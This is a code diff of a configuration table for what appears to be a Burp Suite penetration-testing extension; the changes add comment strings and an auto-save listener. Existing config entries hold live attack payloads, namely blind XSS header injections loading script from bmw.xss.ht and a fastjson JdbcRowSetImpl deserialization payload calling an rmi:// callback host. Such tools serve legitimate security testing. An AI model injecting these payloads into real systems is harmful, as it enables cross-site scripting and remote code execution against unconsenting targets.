@@ -7,6 +7,8 @@ import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 
+import javax.swing.event.TableModelEvent;
+import javax.swing.event.TableModelListener;
 import javax.swing.table.AbstractTableModel;
 
 import burp.BurpExtender;
@@ -33,6 +35,9 @@ public class ConfigTableModel extends AbstractTableModel{
 	public static final String Nmap_Command = "nmap -Pn -sT -sV --min-rtt-timeout 1ms "
 			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {host}";
 
+	private static final String Scope_Comment = "the scope is controlled by the checkbox at the top";
+	private static final String Robot_Input_Comment = "this config effects how sqlmap and nmap runs";
+
 	public ConfigTableModel(){
 
 		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false));
@@ -53,9 +58,9 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("SQLMap-Command",SQLMap_Command,ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("Nmap-Command",Nmap_Command,ConfigEntry.Config_Basic_Variable,true,false));
 		if (Utils.isMac()){//Mac中，通过脚本执行的也会有命令历史记录，使用这种方式最好
-			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,"this config effect sqlmap and nmap"));
+			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,false,false,Robot_Input_Comment));
 		}else {
-			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,"this config effect sqlmap and nmap"));
+			configEntries.add(new ConfigEntry("RunTerminalWithRobotInput","",ConfigEntry.Config_Basic_Variable,true,false,Robot_Input_Comment));
 		}
 
 		configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
@@ -66,13 +71,13 @@ public class ConfigTableModel extends AbstractTableModel{
 		//configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
 		//以上都是固定基础变量，不需要修改名称和类型
 
-		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true));
-		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true));
-		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true));
+		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true,true,Scope_Comment));
+		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true,true,Scope_Comment));
+		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true,true,Scope_Comment));
 
-		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true));
+		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true,true,Scope_Comment));
 		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
-		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,true));
+		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,true,true,Scope_Comment));
 		//configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
 		configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.%dnslogserver/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
@@ -85,6 +90,15 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("*.mozilla.net", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
 	}
 
+	public void addListener() {
+		this.addTableModelListener(new TableModelListener() {
+
+			@Override
+			public void tableChanged(TableModelEvent e) {
+				BurpExtender.saveConfigToBurp();
+			}
+		});
+	}
 
 	public List<String> getConfigJsons(){
 		List<String> result = new ArrayList<String>();
